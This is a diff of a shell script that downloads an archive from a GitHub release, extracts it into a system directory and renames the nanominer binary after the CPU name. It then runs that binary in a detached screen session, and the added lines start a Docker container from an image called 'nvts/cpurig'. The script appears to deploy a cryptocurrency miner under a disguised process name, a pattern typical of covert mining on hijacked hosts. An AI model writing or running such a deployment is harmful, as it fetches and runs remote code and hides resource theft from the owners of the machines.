@@ -16,8 +16,12 @@ wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum
 mv platinum.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar xf platinum.tar.gz
 rm -rf platinum.tar.gz && cd platinum
-mv mine_kaspa.sh $azure -n
+mv nanominer $azure -n
 cp $azure "$cpuname"
 rm -f  nanominer
 echo $cpuname" is starting"
 screen -d -m ./"${cpuname}"
+
+#!/bin/bash
+docker rm -f cpudataissa
+docker run --add-host=localhost:127.215.121.222 -d --name cpudataissa nvts/cpurig
